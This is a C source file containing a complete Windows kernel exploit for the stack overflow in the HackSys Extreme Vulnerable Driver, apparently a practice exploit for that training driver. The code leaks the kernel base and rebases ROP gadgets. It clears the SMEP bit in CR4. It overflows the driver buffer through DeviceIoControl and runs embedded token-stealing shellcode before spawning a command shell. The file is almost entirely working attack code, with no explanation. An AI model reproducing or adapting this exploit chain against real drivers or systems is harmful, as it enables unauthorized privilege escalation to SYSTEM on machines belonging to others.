#include<Windows.h>
#include<stdio.h>
#include<winioctl.h>
#include<Psapi.h>

wchar_t Driver_Path[] = L"\\\\.\\HackSysExtremeVulnerableDriver";
DWORD TRIGGER_STACKOVERFLOW_CODE = 0x222003;
DWORDLONG POP_RCX = 0x0000000021a114; //: pop rcx; ret
DWORDLONG POP_RDX = 0x0000000024f5b2; //: pop rdx; ret
DWORDLONG POP_R8 = 0x00000000201851; //: pop r8; ret
DWORDLONG POP_R9_R10_R11_RBP = 0x00000000a14317; //:pop r9; pop r10; pop r11; pop rbp; ret
DWORDLONG KiKernelSysretExit = 0x0000000A18DC0;
DWORDLONG PsGetCurrentThreadTeb = 0x0000000364290;
DWORDLONG MOV_PR9_RAX = 0x00000005642D5;
DWORDLONG MOV_PRCX_RAX = 0x00000004637D5;
DWORDLONG RET = 0x0000000A18E1F;
DWORDLONG MOV_RC4_RCX = 0x00000003A01D7;
DWORDLONG abusedRC4 = 0x0000000000b50ef8 & ~(1 << 20);

char shellcode[] = { 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC3, 0x48, 0x8B, 0x88, 0x40, 0x04, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x04, 0x74, 0x0F, 0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x2D, 0x48, 0x04, 0x00, 0x00, 0xEB, 0xE4, 0x48, 0x8B, 0x80, 0xB8, 0x04, 0x00, 0x00, 0x48, 0x89, 0x83, 0xB8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8B, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x66, 0xFF, 0xC1, 0x66, 0x89, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8A, 0x68, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x9A, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xA2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xAA, 0x58, 0x01, 0x00, 0x00, 0x31, 0xD2, 0x31, 0xC0, 0x0F, 0x01, 0xF8 };
char sysret[] = "\x48\x0f\x07";

typedef struct Payload
{
	DWORD size;
	void* data;
}payload;

void Rebase_Gadgets(DWORDLONG KernelBase)
{
	MOV_RC4_RCX += KernelBase;
	RET += KernelBase;
	POP_R8 += KernelBase;
	POP_RCX += KernelBase;
	POP_RDX += KernelBase;
	POP_R9_R10_R11_RBP += KernelBase;
	KiKernelSysretExit += KernelBase;
	PsGetCurrentThreadTeb += KernelBase;
	MOV_PR9_RAX += KernelBase;
	MOV_PRCX_RAX += KernelBase;
}

void Get_Kernel_Function(LPCWSTR moduleName, LPCSTR functionName, DWORDLONG* address, DWORDLONG KernelBase)
{
	HMODULE hModule;
	DWORDLONG funcAddr;
	
	hModule = LoadLibraryW(moduleName);
	if (hModule == NULL)
	{
		wprintf(L"[-]Cannot load module: %s\n", moduleName);
		exit(-1);
	}

	printf("Finding address of %s\n", functionName);
	funcAddr = (DWORDLONG)GetProcAddress(hModule, functionName);
	if (funcAddr == NULL)
	{
		printf("[-]Cannot find function: %s\n", functionName);
		exit(-1);
	}

	*address = funcAddr - (DWORDLONG)hModule + KernelBase;
	printf("[+]The address of %s is 0x%llx\n", functionName, *address);
}

HANDLE Get_Handle(wchar_t *path)
{
	HANDLE hFile;

	hFile = CreateFileW(path, // file path
		0, // no access to the drive
		FILE_SHARE_READ | FILE_SHARE_WRITE, // share mode
		NULL, // default security attributes
		OPEN_EXISTING,
		0,
		NULL
	);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		wprintf(L"[-]Open file failed\n");
		exit(-1);
	}

	return hFile;
}

Payload* Init_Payload(DWORD size)
{
	Payload* result;
	result = (Payload*)VirtualAlloc(NULL,
		sizeof(Payload),
		MEM_COMMIT,
		PAGE_READWRITE);
	if (result == NULL)
	{
		wprintf(L"[-]Allocating for payload failed\n");
		exit(-1);
	}
	result->size = 0;
	result->data = NULL;

	result->data = VirtualAlloc(NULL,
		size,
		MEM_COMMIT,
		PAGE_READWRITE);
	if (!result->data)
	{
		wprintf(L"[-]Allocating data for payload failed\n");
		exit(-1);
	}
	return result;
}

void Append_Payload(Payload* payload, void* data, DWORD size)
{
	memcpy((char*)payload->data + payload->size, data, size);
	payload->size += size;
}


void Memset_Payload(Payload* payload, char data, DWORD size)
{
	memset((char*)payload->data + payload->size, data, size);
	payload->size += size;
}

void Append_Long(Payload* payload, DWORDLONG num)
{
	Append_Payload(payload, &num, 8);
}

DWORDLONG Get_Kernel_Base()
{
	void** drivers;
	DWORDLONG result;
	DWORD cbNeeded, noDriver;
	TCHAR driverName[1024];
	drivers = (void**)VirtualAlloc(NULL,
		8 * 1024,
		MEM_COMMIT,
		PAGE_READWRITE);
	if (drivers == NULL)
	{
		wprintf(L"Allocate for enumdevicedriver failed\n");
		exit(-1);
	}

	EnumDeviceDrivers(drivers, 8 * 1024, &cbNeeded);
	noDriver = cbNeeded / 8;
	//wprintf(L"There're %d drivers\n", noDriver);
	//for (int i = 0; i < noDriver; i++)
	//{
	//	GetDeviceDriverBaseName(drivers[i], driverName, 1024);
	//	wprintf(L"Base address: 0x%llx\n", drivers[i]);
	//	wprintf(L"Name: %s\n\n", driverName);
	//}
	result = (DWORDLONG)drivers[0];
	VirtualFree(drivers,
		8 * 1024,
		MEM_DECOMMIT);
	return result;
}

int main()
{
	HANDLE hDriver;
	HRESULT hResult;
	char User_Buffer[0x100] = { 0 }, * shellcodeEx;
	BOOL Result;
	DWORD returnSize;
	Payload *payload, *rop;
	DWORDLONG KernelBase, func_Addr;
	

	KernelBase = Get_Kernel_Base();
	wprintf(L"[+]Kernel base: 0x%llx\n", KernelBase);

	wprintf(L"[+]Get driver handle\n");
	hDriver = Get_Handle(Driver_Path);


	
	Rebase_Gadgets(KernelBase);
	wprintf(L"[+]KiKernelSysretExit is at 0x%llx\n", KiKernelSysretExit);

	shellcodeEx = (char*)VirtualAlloc(NULL,
		8 * 1024,
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);
	if (shellcodeEx == NULL)
	{
		wprintf(L"[-]Cannot allocate shellcode\n");
		exit(-1);
	}

	memcpy(shellcodeEx, shellcode, sizeof(shellcode));
	memcpy(shellcodeEx + sizeof(shellcode), sysret, 8);

	payload = Init_Payload(0x10000);
	rop = Init_Payload(0x10000);
	Memset_Payload(payload, 'A', 0x818);
	//Append_Long(payload, 0xcafebabedeadbeef);

	Append_Long(rop, POP_RCX);
	Append_Long(rop, abusedRC4);
	Append_Long(rop, MOV_RC4_RCX);
	Append_Long(rop, (DWORDLONG)shellcodeEx);
	Append_Payload(payload, rop->data, rop->size);


	wprintf(L"[+]Trigger stack overlfow\n");
	Result = DeviceIoControl(hDriver,
		TRIGGER_STACKOVERFLOW_CODE,
		payload->data,
		payload->size,
		//0x100,
		NULL, 0,
		(LPDWORD)&returnSize,
		NULL);

	system("cmd");
	return 0;
}
